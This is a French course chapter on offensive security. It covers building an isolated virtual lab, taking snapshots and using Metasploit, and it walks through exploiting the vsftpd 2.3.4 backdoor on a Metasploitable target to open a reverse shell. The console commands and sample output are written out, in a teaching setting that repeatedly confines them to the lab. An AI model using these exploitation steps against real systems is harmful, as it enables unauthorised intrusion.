@@ -1,0 +1,702 @@
+Bienvenue dans le troisième chapitre du parcours Cybersécurité offensive. Les deux chapitres précédents vous ont appris à cartographier une surface d'attaque sans vous déclarer, puis à analyser et à hiérarchiser des vulnérabilités web sans confondre un signalement automatique avec une faille démontrée. Vous savez donc chercher et vous savez juger. Ce chapitre fait le pont : il s'agit de passer du « ce service semble vulnérable » au « j'ai obtenu une session, voici ce que j'ai pu faire, voici ce que je n'ai pas pu prouver ». C'est le moment le plus délicat du parcours, parce qu'il réunit une compétence technique exigeante et une responsabilité qui ne se négocie pas.
+
+Les objectifs sont au nombre de six et ils commandent toute la leçon. Le premier consiste à construire un laboratoire isolé, avec un hyperviseur, des réseaux host-only et des snapshots, parce que rien de ce qui suit n'est pensable sans un terrain où l'on peut se tromper sans conséquence. Le deuxième consiste à maîtriser les bases de Metasploit : console, modules, bases de données et recherche. Le troisième consiste à distinguer un module d'exploitation d'un module auxiliaire, puis à suivre pas à pas ce qui se réellement se passe entre le lancement d'un module et l'ouverture d'une session. Le quatrième consiste à comprendre les reverse shells, les bind shells, les stagers et le choix d'une couche de transport. Le cinquième consiste à stabiliser un shell, c'est-à-dire à lui survivre au-delà des trente premières secondes. Le sixième consiste à évaluer honnêtement un risque, à respecter des limites éthiques strictes, à sauvegarder et à documenter le travail.
+
+Le cadre, enfin, tient en une phrase que vous relirez à chaque session : tout ce qui est décrit dans ce chapitre se pratique dans un laboratoire isolé, sur des machines que vous avez vous-même créées, et jamais contre une cible réelle. Pour ancrer le propos, nous construisons ensemble un lab nommé lab-off3, composé d'une machine d'attaque, de deux cibles et d'un plan d'adressage fixe. Toutes les commandes, tous les exemples et tous les résultats cités dans la leçon proviennent de ce lab. Quand un point de méthode concerne le monde réel, il est signalé comme tel, et il concerne alors la manière de rendre un compte, pas la manière d'attaquer.
+
+## Construire le laboratoire : hyperviseurs, machines et images de base
+
+Un laboratoire d'exploitation n'est pas un agrégat de machines virtuelles au hasard : c'est un dispositif reproductible, dont chaque composant a un rôle, un nom et un état connu. La première décision est celle de l'hyperviseur, et elle se prend en fonction de trois contraintes seulement : le budget, le système hôte et la nécessité d'un scripting en ligne de commande. VirtualBox couvre la majorité des cas, car il est gratuit, disponible sous Windows, macOS et Linux, et il expose toute sa gestion dans la commande VBoxManage, ce qui permet de documenter et de rejouer une configuration. VMware Workstation Pro, gratuit pour un usage personnel depuis 2024, reste pertinent si votre organisme l'utilise déjà, avec une interface et des performances légèrement supérieures sur les cibles Windows. Si votre poste fonctionne sous Linux, KVM avec libvirt est une alternative native, plus légère, mais dont la prise en main demande davantage de confort avec la ligne de commande.
+
+Quel que soit votre choix, vérifiez d'abord la virtualisation matérielle, faute de quoi vos machines ralentiront au point de rendre les exercices pénibles. Sous Windows, l'outil System Information indique la valeur de la virtualisation de la mémoire à l'exécution ; sous Linux, la présence du module kvm_intel ou kvm_amd suffit ; dans le BIOS ou l'UEFI, l'option porte le nom VT-x ou AMD-V. Prévoyez ensuite une machine hôte correctement dotée : seize gigaoctets de mémoire vive est le minimum confortable, trente-deux sont préférables si vous lancez en même temps une machine d'attaque, deux cibles et un routeur, et un disque SSD évite les blocages prolongés lors des retours arrière.
+
+L'inventaire du lab tient en quatre machines, et chaque nom doit indiquer le rôle plutôt que le contenu. La machine d'attaque, nommée kali-lab, reçoit une distribution d'attaque classique installée à jour, avec Metasploit, Nmap, Wireshark et un éditeur de texte. La première cible, linux-target1, est une machine volontairement fragile : c'est l'usage classique d'une image pédagogique comme Metasploitable, conçue pour être compromise, avec des services anciens volontairement exposés comme un serveur FTP, un serveur SMB, un serveur web et une base de données. La deuxième cible, win10-lab, est une installation propre et légitime d'un poste Windows, sur laquelle vous appliquerez vous-même les correctifs, afin d'apprendre que l'exploitation d'un système à jour est un problème radicalement différent. Enfin, si vous voulez travailler avec plusieurs segments, un routeur virtuel tel qu'OPNsense ou pfSense jouera le rôle de frontière entre eux.
+
+La provenance des images est un point de méthode, pas un détail. Téléchargez uniquement depuis les dépôts officiels des éditeurs ou des projets, et vérifiez l'empreinte du fichier avant toute installation. Une image récupérée sur un forum, même si son nom est exactement celui attendu, peut contenir un backdoor qui transforme votre lab en machine compromise, et vous n'auriez aucun moyen de le savoir. La commande suivante illustre le réflexe à acquérir, et il doit preceder le premier démarrage comme il précèdera chaque réinstallation.
+
+```bash
+# vérifier l'empreinte d'une image avant de l'installer dans le lab
+sha256sum Metasploitable2-Linux.iso > lab-off3/empreintes.txt
+sha256sum kali-linux-2026-installer-amd64.iso >> lab-off3/empreintes.txt
+cat lab-off3/empreintes.txt
+# comparer à la valeur publiée par l'éditeur, puis archiver le fichier
+```
+
+Deux réglages d'hyperviseur méritent une attention particulière parce qu'ils trompent les débutants. Le premier concerne les fonctions de confort : dossier partagé, presse-papiers et glisser-déposer doivent être désactivés sur les cibles, car elles fabriquent des ponts entre votre poste et la machine exploitée qui n'existent pas dans une configuration réelle, et elles vous feraient conclure à la présence de services qui ne sont en fait que des ajouts d'hôtes invités. Le deuxième concerne le dos de disque : gardez une image dite propre, jamais utilisée pour un exercice, et dupliquez-la pour chaque nouvelle séance, afin de pouvoir recommencer sans hériter des dégâts de la session précédente.
+
+La capture ci-dessous montre la gestion des machines d'un hyperviseur tel que vous le verrez au quotidien : la liste des machines, leur état et le dossier qui les contient. Prenez l'habitude de nommer les machines et les snapshots avec une convention unique, parce que dans trois semaines vous ne vous rappellerez plus si win10-lab-02 est l'état propre ou l'état corrompu.
+
+```image
+https://upload.wikimedia.org/wikipedia/commons/thumb/4/4d/Wcubuntu24041ltszhtwvbox20241030.png/960px-Wcubuntu24041ltszhtwvbox20241030.png
+| Fenêtre de gestion des machines virtuelles d'un hyperviseur, avec la liste des machines, leur état et le stockage associé, telle qu'elle s'affiche dans un laboratoire isolé.
+```
+
+Le tableau suivant résume les arbitrages entre les trois solutions courantes, avec pour chacune le point fort, la limite et la conséquence pour votre travail de lab.
+
+```table
+| Hyperviseur | Point fort | Limite à connaître | Conséquence pour le lab |
+| --- | --- | --- | --- |
+| VirtualBox | Gratuit, multiplateforme, gestion complète en VBoxManage | Performances graphiques et disque moyennes sous Windows | Scriptez la création et les snapshots en bash |
+| VMware Workstation Pro | Interface soignée, bonnes performances sur Windows | Écosystème propriétaire, licences selon usage | Moins pratique pour automatiser la documentation |
+| KVM et libvirt | Natif sous Linux, très léger | Prise en main plus technique | Excellent pour rejouer le lab depuis un dépôt de scripts |
+```
+
+Un dernier réflexe, avant de passer au réseau : constituez un dossier lab-off3 sur un disque dédié, contenant les images, les empreintes, les notes de séance et les scripts de création. Ce dossier est le vrai patrimoine du laboratoire ; les machines virtuelles ne sont que sa matérialisation, et la section sur la sauvegarde vous montrera pourquoi cette distinction est décisive.
+
+## Réseaux host-only, NAT et isolation : la barrière qui compte vraiment
+
+La qualité d'un laboratoire d'exploitation se mesure à une seule propriété : la capacité de ses machines à ne jamais joindre un système qui n'en fait pas partie. Tous les incidents pédagogiques les plus embarrassants viennent d'une carte réseau mal configurée, et tous sont évitables par une compréhension précise des modes de connexion proposés par l'hyperviseur. Prenons-les un par un, en partant de celui qu'il ne faut jamais utiliser dans ce chapitre.
+
+Le mode pont, souvent proposé par défaut ou presque, relie la carte virtuelle de la machine au réseau physique de votre poste, comme si elle en était un hôte de plus. Elle reçoit alors une adresse par le serveur DHCP de votre réseau, visible par tous les appareils, et ses paquets sortent sur le câble. Dans un exercice d'exploitation, c'est inacceptable : vos scans toucheraient votre réseau domestique ou l réseau de votre organisme, vos reverse shells s'adresseraient à des tiers, et les journaux de votre routeur enregistreraient une activité que vous n'auriez jamais dû produire. Le mode pont ne devrait même pas être envisagé dans ce chapitre, et il faut vérifier son absence avant chaque séance.
+
+Le mode NAT fait l'inverse : la machine peut joindre l'extérieur, mais personne de l'extérieur ne peut la joindre. C'est le mode adapté à une phase de préparation, c'est-à-dire au téléchargement des correctifs et des paquets, et à rien d'autre. Le mode réseau host-only, lui, crée un lien privé entre votre poste hôte et les machines configurées sur ce réseau : un commutateur virtuel sans sortie vers le monde. C'est l'échine dorsale du lab-off3. Le mode réseau interne va plus loin encore, puisqu'il relie exclusivement des machines virtuelles entre elles, sans impliquer le poste hôte, ce qui est utile pour isoler un segment sensible ou pour simuler un réseau que l'hôte ne doit pas voir.
+
+La configuration retenue pour notre lab associe deux cartes réseau à la machine d'attaque et une seule aux cibles. La première carte de kali-lab est rattachée au réseau host-only, avec une adresse fixe ; la seconde est en NAT, mais elle est déconnectée pendant les exercices, ce qui vous oblige à rester dans le périmètre. Les deux cibles n'ont qu'une carte host-only. Le plan d'adressage est le suivant : la passerelle du réseau host-only est en 192.168.56.1, kali-lab utilise la 192.168.56.10, linux-target1 la 192.168.56.20 et win10-lab la 192.168.56.30.
+
+Les adresses fixes ne sont pas une coquetterie. Avec le service DHCP de l'hyperviseur, une cible peut récupérer une adresse différente après un redémarrage, et vous perdrez alors vos notes, vos scripts et vos modules configurés sur l'ancienne valeur. Désactivez le serveur DHCP du réseau host-only, ou réservez systématiquement les adresses, puis consignez le plan dans un fichier que vous relirez à chaque séance. La reproductibilité d'un lab ne vient pas de la chance, elle vient d'un tableau écrit.
+
+Le contrôle d'isolation est un rituel de trois minutes, à mener avant toute exploitation et à noter dans le carnet. Depuis la machine d'attaque, vérifiez les adresses, la table de routage et l'absence de route par défaut vers l'extérieur, puis tentez délibérément de joindre une adresse publique. Depuis une cible, confirmez qu'elle ne voit que le segment host-only. Depuis le poste hôte, confirmez que la carte host-only ne porte pas de route vers le réseau physique.
+
+```bash
+# contrôle d'isolation depuis la machine d'attaque du lab-off3
+ip -brief address show          # la carte host-only doit être en 192.168.56.10
+ip route show                   # seule la route vers 192.168.56.0/24 doit exister
+ping -c 2 192.168.56.20         # la cible répond
+ping -c 2 1.1.1.1               # doit échouer : la carte NAT est déconnectée
+ss -tulpn                       # confirmer qu'aucun service d'écoute n'est exposé
+```
+
+Si la dernière commande échoue comme prévu, le lab est isolé et vous pouvez travailler. Si elle répond, la carte NAT est encore active ou une route par défaut subsiste : corrigez avant de continuer, sans exception. Le tableau ci-dessous compare les modes de réseau et indique pour chacun le rôle qu'il joue dans notre laboratoire.
+
+```table
+| Mode de réseau | Accès sortant | Accès entrant | Rôle dans le lab-off3 |
+| --- | --- | --- | --- |
+| Pont | Oui, sur le réseau physique | Oui, depuis le réseau physique | Interdit dans tout le chapitre |
+| NAT | Oui, vers internet | Non | Préparation et mises à jour seulement |
+| Host-only | Non | Depuis l'hôte et les machines du réseau | Segment de travail principal |
+| Réseau interne | Non | Uniquement entre machines virtuelles | Segments avancés et routeur virtuel |
+```
+
+Un piège fréquent mérite d'être signalé parce qu'il ressort de nombreux comptes rendus d'apprenants : l'isolement n'est pas toujours là où on le croit. Un poste Windows qui signale « réseau sans accès Internet » n'est pas pour autant isolé, et un pare-feu hôte peut, lui aussi, masquer le problème en refusant le trafic au lieu de le laisser fuiter. D'autres environnements, notamment ceux qui s'appuient sur une virtualisation système, ajoutent leurs propres commutateurs virtuels et leurs propres adresses, et il n'est pas rare de voir apparaître une troisième carte que personne n'a demandée. La consigne reste la même : inspectez les adresses, les routes et le trafic réel, plutôt que de faire confiance à l'interface graphique.
+
+Pour observer ce qui circule réellement sur le segment, branchez Wireshark sur l'interface host-only du poste hôte ou sur la carte de la machine d'attaque, puis déclenchez un simple ping. Vous verrez les requêtes ARP qui précèdent chaque communication, la résolution d'adresse et le trafic ICMP. Ce réflexe, pris dès le premier chapitre du lab, vous rendra un service considérable plus tard : la moitié des exploits qui échouent sans raison apparente se diagnostiquent en trois paquets capturés.
+
+## Snapshots : le retour arrière comme méthode de travail
+
+Le snapshot est l'outil qui transforme un laboratoire en un vrai lieu d'apprentissage, parce qu'il supprime la peur de casser. Comprendre ce qu'il est réellement, c'est comprendre à la fois son immense valeur et sa limite la plus dangereuse. Un snapshot fige l'état d'une machine virtuelle : le contenu des disques à l'instant T, l'état de la mémoire si la machine tournait encore, et les réglages associés. À la restauration, tout revient à cet instant. Techniquement, l'hyperviseur conserve l'état d'origine et écrit les modifications suivantes dans un disque différenciel ; cela explique la rapidité de la prise de snapshot et la lenteur de sa suppression.
+
+La conséquence pratique est immédiate : un snapshot n'est pas une sauvegarde. Il vit dans le même dossier que la machine, sur le même disque ; si le disque tombe en panne, machine et snapshots disparaissent ensemble. Il ne protège ni contre une corruption, ni contre une suppression accidentelle, ni contre le vol du poste. La sauvegarde du lab fait l'objet d'une section dédiée, et elle repose sur des copies déconnectées du laboratoire ; le snapshot, lui, sert à autre chose : à revenir en arrière, vite, autant de fois que nécessaire.
+
+La discipline du lab repose sur trois points de repère dans le temps. Le premier s'appelle base-propre : c'est l'état obtenu après installation, mise à jour et configuration du réseau, jamais modifié par la suite. Le deuxième s'appelle pret-exercice : c'est la base-propre avec les services vérifiés et les adresses fixes en place, à partir duquel chaque séance commence. Le troisième est un snapshot par séance, nommé avec la date et l'objectif, par exemple 2026-10-09-enum-smb. Une convention de nommage stricte vous évitera, dans un mois, de restaurer l'état corrompu en croyant reprendre l'état propre.
+
+```bash
+# créer et restaurer des snapshots depuis la ligne de commande
+VBoxManage snapshot "linux-target1" take "base-propre" --description "apres mise a jour"
+VBoxManage snapshot "linux-target1" take "pret-exercice" --description "reseau fixed, services verifies"
+VBoxManage snapshot "linux-target1" list
+VBoxManage snapshot "linux-target1" restore "pret-exercice"
+# regrouper les modifications supprimees, une operation lente a ne pas faire avant un delai
+VBoxManage closemedium disk "/vms/linux-target1/linux-target1.vdi" --delete  # jamais pendant un exercice
+```
+
+Le rythme de retour arrière que nous recommandons tient en un geste : documenter d'abord, restaurer ensuite. À l'issue d'un exercice, vous recopiez dans votre carnet la commande lancée, le résultat obtenu, l'artefact produit et le point de bascule, puis vous restaurez l'état pret-exercice. Vous recommencez ainsi dix fois en une heure si nécessaire, et chaque tentative repart d'un état identique. Sans cette discipline, vos résultats ne sont pas comparables : vous mesurez alors l'effet d'une série de dégâts accumulés, pas l'effet de la technique que vous étudiez.
+
+```table
+| État du snapshot | Quand le prendre | Ce qu'il garantit | Ce qu'il ne garantit pas |
+| --- | --- | --- | --- |
+| base-propre | Après installation et mise à jour | Un point de départ identique | Rien si le disque hôte tombe en panne |
+| pret-exercice | Avant chaque séance | Un réseau et des services connus | L'absence de dérive du système hôte |
+| en-cours | Au milieu d'un exercice long | La reprise après un crash | La comparabilité des résultats |
+| a-archiver | Après une séance concluante | La conservation d'un cas d'école | Une copie hors machine |
+```
+
+Trois pièges reviennent constamment. Le premier est la restauration d'un état pris pendant que la machine tournait : la mémoire figée contient d'anciens identifiants de session, un cache réseau périmé et souvent une horloge décalée, et vous vous retrouvez avec des comportements impossibles à expliquer. Le deuxième est la chaîne de snapshots : au-delà de quatre ou cinq enfilades, les performances chutent visiblement, et la suppression du premier maillon impose une fusion longue et risquée. Le troisième est l'accumulation : chaque snapshot consomme de l'espace, un disque presque plein empêche toute nouvelle prise d'état, et il faut donc purger régulièrement les états de séances closes.
+
+L'horloge mérite une mention particulière, car elle est la source d'erreurs les plus déroutantes dans un lab. Restaurer un snapshot ramène la date de la machine à celle de la prise : les journaux se décalent, les certificats semblent expirés ou pas encore valables, et les protocoles sensibles au temps refusent la connexion. Après chaque restauration, synchronisez l'horloge avant toute manipulation, et notez dans votre carnet l'écart constaté, faute de quoi vous attribuerez à un exploit un symptôme qui n'est qu'une affaire de fuseau.
+
+```bash
+# apres chaque restauration : remettre l'horloge et verifier le reseau
+sudo timedatectl set-ntp true && timedatectl
+ip -brief address show && ip route show
+# sous Windows, depuis une invite de commandes elevee
+w32tm /resync /rediscover
+ipconfig /all
+```
+
+La boucle complète, que vous devez être capable d'exécuter les yeux fermés avant la fin de ce chapitre, tient donc en cinq gestes : vérifier l'isolation, restaurer l'état pret-exercice, remettre l'horloge, dérouler l'exercice, puis documenter avant de restaurer à nouveau. Ce rythme est le fondement de tout ce qui suit : sans retour arrière fiable, ni Metasploit, ni les shells, ni l'évaluation d'un risque n'ont de sens, puisque vous ne saurez jamais dans quel état se trouve la machine que vous prétendez analyser.
+
+Avec un lab isolé, un réseau de travail statique et une boucle de retour arrière maîtrisée, vous disposez enfin du terrain sur lequel la partie offensive du chapitre peut se dérouler. Cette seconde partie est consacrée à l'outil que vous allez manipuler le plus souvent, Metasploit, et à la distinction qui structure tout son catalogue : un module d'exploitation n'est pas un module auxiliaire, et confondre les deux conduit à des diagnostics absurdes. Nous terminerons par le déroulé concret d'une exploitation, de la recherche du module à l'ouverture de la session, afin que vous ne voyiez jamais dans la commande exploit une boîte noire magique.
+
+Un mot sur la manière de suivre cette partie. Ouvrez une console à côté de votre texte, créez un espace de travail nommé lab-off3, et rejouez chaque exemple sur linux-target1 plutôt que de le lire passivement. Les commandes de cette partie sont toutes sans danger pour votre poste hôte, à condition qu'elles visent les seules adresses du réseau host-only, et cette précaution, vous la vérifierez vous-même avant chaque lancement.
+
+## Metasploit dans le lab : console, projets et gestion des bases
+
+Metasploit est un framework d'exploitation modulaire : il ne contient pas tant une suite d'outils qu'une bibliothèque de modules classés par nature, un moteur d'exécution et une base de données qui retient ce que vous avez trouvé. L'installation la plus simple passe par le gestionnaire de paquets de votre distribution d'attaque, et une installation par clone du dépôt officiel reste possible si vous voulez suivre les versions au jour le jour. Dans les deux cas, la commande d'entrée est unique : msfconsole. Elle ouvre une console interactive, lente au démarrage parce qu'elle charge la totalité du catalogue, et qui affiche enfin un prompt sur lequel vous allez passer les heures qui viennent.
+
+```bash
+# installer et initialiser le framework dans le lab-off3
+sudo apt update && sudo apt install -y metasploit-framework
+msfdb init          # cree la base Postgres locale et le compte dedie
+msfdb status        # confirmer que le serveur et la base repondent
+msfconsole -q       # demarrage silencieux, sans le bandeau d'accueil
+```
+
+La console repose sur un vocabulaire réduit qu'il faut maîtriser avant tout le reste. La commande search cherche un module par mot-clé, par identifiant CVE, par plateforme ou par type, et c'est par elle qu'on commence toujours. La commande info décrit un module sans le charger : ses options, ses cibles, son rang, ses références et, souvent, un exemple de configuration. La commande use charge le module dans le contexte courant, et le prompt change alors pour afficher son identifiant complet. Vient ensuite show options, qui liste les paramètres à renseigner avec leur état, suivi de set pour affecter une valeur, de setg pour affecter une valeur globale à la session de console, et de unset pour l'effacer. La commande show payloads affiche les charges utiles compatibles avec le module choisi, et show targets les systèmes que le module sait traiter.
+
+```text
+# sequence typeique de configuration dans msfconsole
+msf6 > search type:exploit platform:linux samba
+msf6 > use exploit/unix/vsftpd_234_backdoor
+msf6 > info
+msf6 > show options
+msf6 > set RHOSTS 192.168.56.20
+msf6 > set LHOST 192.168.56.10
+msf6 > show payloads
+msf6 > set PAYLOAD cmd/unix/reverse
+msf6 > exploit
+```
+
+La mémoire de la console est un point de vigilance. Les valeurs définies avec setg persistent tant que la console tourne, et un LHOST défini au chapitre précédent reste en vigueur au suivant si vous ne l'avez pas effacé. Il n'est pas rare de voir une exploitation échouer pour la seule raison que la variable globale pointe encore vers l'ancien réseau host-only. Le réflexe correct est mécanique : avant chaque lancement, relisez show options, vérifiez les trois adresses, puis exécutez unsetg LHOST si nécessaire. Une console que vous relisez est votre première ligne de défense contre vos propres oublis.
+
+La base de données change la nature du travail. Sans base, Metasploit est un catalogue ; avec base, c'est un journal de campagne. La commande workspace crée, liste et bascule entre des espaces de travail indépendants, chacun avec ses hôtes, ses services, ses vulnérabilités et ses preuves. La commande db_nmap exécute un scan dont les résultats sont enregistrés directement dans l'espace courant, et les commandes hosts, services et vulns permettent ensuite de les interroger sans rouvrir vos fichiers de sortie. Pour un lab, un espace par séance suffit, et le nom doit indiquer la date et l'objectif.
+
+```bash
+# dans msfconsole : tracer la campagne dans la base du lab-off3
+msf6 > workspace -a 2026-10-09-enum-smb
+msf6 > db_nmap -sV -sC -O 192.168.56.20
+msf6 > hosts
+msf6 > services 192.168.56.20
+msf6 > vulns 192.168.56.20
+```
+
+L'automatisation mérite deux commandes connues dès maintenant, parce qu'elles rendent vos démonstrations reproductibles. L'option -x de msfconsole exécute une chaîne de commandes puis quitte, ce qui est idéal pour rejouer une configuration sans tapage. L'option -r exécute un fichier de ressources, c'est-à-dire un script de la console contenant les mêmes commandes, une par ligne. Conservez ces fichiers dans votre dossier lab-off3 : ils constituent la preuve exécutable de la manière dont vous avez obtenu un résultat.
+
+```bash
+# rejouer une configuration complete sans intervention
+msfconsole -q -x "workspace lab-off3; use exploit/unix/vsftpd_234_backdoor; \
+set RHOSTS 192.168.56.20; set LHOST 192.168.56.10; set PAYLOAD cmd/unix/reverse; \
+set ExitOnSession false; run -j; sleep 5; sessions -l; exit"
+```
+
+La capture suivante montre une console Metasploit en fonctionnement : le catalogue affiché au démarrage, le prompt du module chargé et les options en attente de valeur. Elle correspond exactement à l'état dans lequel vous vous trouverez au milieu d'un exercice, et c'est à cet écran qu'il faut revenir pour vérifier ce que l'on s'apprête à lancer.
+
+```image
+https://upload.wikimedia.org/wikipedia/commons/thumb/9/9f/Metasploit_4.14.0_from_Kali.png/960px-Metasploit_4.14.0_from_Kali.png
+| Console Metasploit Framework exécutée dans un terminal, affichant le catalogue des modules et l'invite de commande prête à recevoir une configuration.
+```
+
+Le tableau suivant résume les commandes que vous utiliserez quotidiennement, avec la question à laquelle chacune répond.
+
+```table
+| Commande | Question à laquelle elle répond | Réflexe associé |
+| --- | --- | --- |
+| search | Quel module correspond à ce que je viens de trouver ? | Filtrer par type et par plateforme |
+| info | Que fait ce module exactement ? | Lire les références et les cibles avant de lancer |
+| show options | Ai-je tout renseigné, et pour quelle machine ? | Relire avant chaque exploitation |
+| show payloads | Quelle charge utile est compatible ? | Choisir en connaissance de la couche |
+| workspace et db_nmap | Qu'ai-je déjà trouvé, et où ? | Un espace par séance, jamais un mélange |
+| sessions et jobs | Qu'est-ce qui tourne en arrière-plan ? | Vérifier avant et après chaque lancement |
+```
+
+## Exploit et auxiliary : deux familles de modules, deux rôles
+
+Le catalogue de Metasploit est organisé en répertoires qui correspondent à des rôles distincts, et la première distinction, celle qui structure tout le reste, oppose les modules exploit aux modules auxiliary. Un module d'exploitation cherche à provoquer un comportement anormal dans un service pour y faire exécuter du code, et il livre pour cela une charge utile : son succès se mesure à l'ouverture d'une session, son échec à l'absence de session. Un module auxiliaire, lui, ne livre rien : il scanne, il récupère des informations, il force des identifiants dans un périmètre maîtrisé, il détecte des versions, il sert parfois à démontrer un déni de service en laboratoire. Son succès se mesure à la qualité de l'information obtenue, pas à une session.
+
+Cette distinction a une conséquence directe sur la manière de les lancer. Un exploit s'exécute avec exploit, ou avec son alias run, et il peut échouer silencieusement, planter la connexion cible ou ouvrir une session que vous n'attendiez pas. Un auxiliary s'exécute avec run, il produit des lignes de sortie structurées, et il s'arrête quand sa tâche est terminée. Beaucoup de modules auxiliaires sont aussi des scanners, c'est-à-dire qu'ils acceptent une plage d'adresses : dans un lab, cette plage doit toujours rester celle du réseau host-only, et la relire avant de lancer est aussi réflexe que de vérifier une adresse de destination avant d'envoyer un courriel.
+
+Un troisième point concerne le rang d'un module, affiché par la commande info. Il prend des valeurs comme manual, low, average, good, great ou excellent, et il exprime la fiabilité de l'exploitation, pas la gravité de la faille. Un module excellent n'est pas une faille critique : c'est un mécanisme d'exploitation réputé stable sur la configuration visée. Inversement, un module manual demande une intervention humaine à chaque étape, ce qui ne le rend pas inutile, mais impose de lire sa documentation entière avant de le charger. Dans un lab d'apprentissage, commencez par les modules de rang excellent sur la cible pédagogique, puis descendez vers les rangs inférieurs quand vous cherchez à comprendre la mécanique.
+
+```text
+# deux modules, deux logiques, meme console
+msf6 > use auxiliary/scanner/portscan/tcp
+msf6 > show options
+msf6 > set RHOSTS 192.168.56.20
+msf6 > set THREADS 10
+msf6 > run
+# sortie : liste de ports, aucun effet sur la cible
+
+msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
+msf6 > info
+# rang affiche, cibles supportees, charge utile par defaut
+msf6 > set RHOSTS 192.168.56.20
+msf6 > exploit
+# sortie : tentative d'exploitation puis ouverture d'une session
+```
+
+Au-delà de ces deux familles, il faut connaître les modules post et les modules payload, qui interviennent à d'autres moments du cycle. Les modules post s'exécutent dans une session déjà ouverte, sur la machine compromise, et servent à collecter des informations, à explorer le réseau interne ou à tenter une élévation de privilèges : ils n'ont aucun sens sans session, et leur présence dans une démonstration prouve que vous êtes allé au-delà de l'accès initial. Les modules payload sont les charges utiles elles-mêmes, consultables avec show payloads, et leur choix détermine tout ce qui arrive ensuite, y compris la nature du shell que vous obtiendrez. Les encoders et les générateurs NOP, enfin, servent à modifier l'apparence d'une charge utile ou à préserver l'alignement mémoire attendu, et ils relèvent davantage de la compréhension du format que de l'exploitation quotidienne.
+
+```table
+| Famille | Livre-t-elle une charge utile ? | Moment d'usage | Mesure du succès |
+| --- | --- | --- | --- |
+| exploit | Oui, après déclenchement de la faille | Accès initial | Session ouverte et stable |
+| auxiliary | Non | Reconnaissance, scan, test de service | Information fiable obtenue |
+| post | Non, elle s'appuie sur une session | Après l'accès initial | Connaissance accrue de la machine |
+| payload | Elle est la charge utile | Choix avant le lancement | Compatibilité avec la cible |
+| encoder et nop | Non, elles modifient une charge | Préparation d'une charge | Exécution sans crash mémoire |
+```
+
+Le cas suivant, tiré d'une séance du lab-off3, illustre l'erreur classique qui motive cette section. Un apprenant lance un module auxiliaire de détection de version, obtient une ligne indiquant qu'un serveur SSH tourne, puis tape la commande exploit en croyant que la console va en déduire la suite. Rien ne se passe, et il en conclut que la machine n'est pas vulnérable. En réalité, il n'a jamais chargé de module d'exploitation : la console exécute exactement ce qu'on lui demande, ni plus ni moins. Le diagnostic correct se déroule en trois questions : quel module est chargé, que fait-il par nature, et ai-je renseigné ses options pour la bonne machine.
+
+## Du scan à la session : le déroulé concret d'une exploitation
+
+Nous pouvons maintenant suivre une exploitation de bout en bout, dans le lab-off3, contre la cible pédagogique linux-target1. L'objectif de cette section n'est pas de vous donner un script à recopier, mais de rendre visible chaque étape, afin que vous sachiez diagnostiquer la vôtre quand elle échouera, ce qui est la règle et non l'exception.
+
+Tout commence par la reconnaissance en base. Vous lancez un scan de services avec db_nmap, vous consultez la liste des ports ouverts avec services, et vous croisez les résultats avec les modules disponibles en tapant search suivi du nom du service ou du numéro d'identification associé. Cette étape produit souvent trois ou quatre modules candidats : filtrez ensuite par plateforme, par version exacte relevée, et par rang. Le critère décisif n'est pas le nombre de fonctionnalités du module, mais la correspondance entre sa cible déclarée et l'état réel de votre machine virtuelle.
+
+```bash
+# reconnaissance en base puis selection du module
+msf6 > workspace lab-off3
+msf6 > db_nmap -sV -sC -O 192.168.56.20
+msf6 > services 192.168.56.20 --sort port
+msf6 > search vsftpd
+msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
+msf6 > show options
+msf6 > set RHOSTS 192.168.56.20
+msf6 > set LHOST 192.168.56.10
+msf6 > show payloads
+```
+
+Vient le moment du choix de la charge utile, et il est plus important qu'il n'y paraît. L'option LHOST doit porter l'adresse de la carte host-only de la machine d'attaque, jamais une autre : si vous laissez la valeur par défaut, souvent une adresse de bouclage, la cible tentera de se connecter à elle-même et la tentative échouera sans message clair. L'option LPORT doit être libre sur la machine d'attaque, et il faut vérifier qu'aucun job précédent ne l'occupe encore. Une fois ces deux points tranchés, vous lancez exploit, ou run pour l'exécuter en arrière-plan avec l'option -j.
+
+```text
+# deroule complet dans la console, avec sortie commentee
+msf6 > set LHOST 192.168.56.10
+LHOST => 192.168.56.10
+msf6 > set ExitOnSession false
+ExitOnSession => false
+msf6 > exploit -j
+[*] Exploit running as background job 0.
+[*] Started reverse TCP handler on 192.168.56.10:4444
+[*] 192.168.56.20:21 - Submitted command to wrapper
+[*] Command shell session 1 opened ...
+msf6 > sessions -l
+   Id  Type  Information  Path
+   ---  ----  -----------  ----
+   1    shell  cmd/unix/reverse  192.168.56.10:4444 -> 192.168.56.20:51326
+```
+
+Sous la commande exploit, plusieurs choses se produisent simultanément, et il faut les visualiser pour diagnostiquer. Sur la machine d'attaque, un écouteur s'ouvre sur l'adresse et le port indiqués : c'est le gestionnaire de session, et il attend la connexion. Sur la cible, le module déclenche la faille, la charge utile s'exécute, puis elle initie une connexion vers l'écouteur. Dès que la connexion est acceptée, la console ouvre une session et vous rend la main. Trois pannes sont donc possibles et chacune a sa signature : le gestionnaire n'a pas démarré, le port est déjà occupé ; la connexion cible n'arrive pas, adresse ou port incorrect, pare-feu, ou route manquante ; la session s'ouvre puis se referme aussitôt, charge utile inadaptée à l'architecture ou processus éphémère.
+
+Le travail ne fait que commencer quand la session apparaît. Interrogez-la avec sessions -i suivi de son identifiant pour basculer dedans, puis revenez à la console avec background ou le raccourci clavier associé. La commande sessions -u propose d'élever une session brute vers une session plus riche, et la commande jobs liste les tâches en arrière-plan, qu'il ne faut jamais perdre de vue : un écouteur oublié occupe un port, et un port occupé fait échouer la séance suivante avec un message qui ne dit rien de cela.
+
+```table
+| Symptôme | Cause la plus probable | Vérification immédiate |
+| --- | --- | --- |
+| Started reverse handler puis rien | Port d'écoute déjà pris par un job | jobs et ss -tulpn sur la machine d'attaque |
+| Connection refused sur la cible | Mauvaise adresse LHOST ou port filtré | ip route et adresse host-only relue |
+| Session ouverte puis fermée | Charge utile incompatible avec l'architecture | uname -m et show payloads relus |
+| Aucune session, pas d'erreur | Module inadapté à la version réelle | info et version relevée par le scan |
+| Session gelée après quelques secondes | Réseau host-only coupé ou machine en veille | contrôle d'isolation relancé |
+```
+
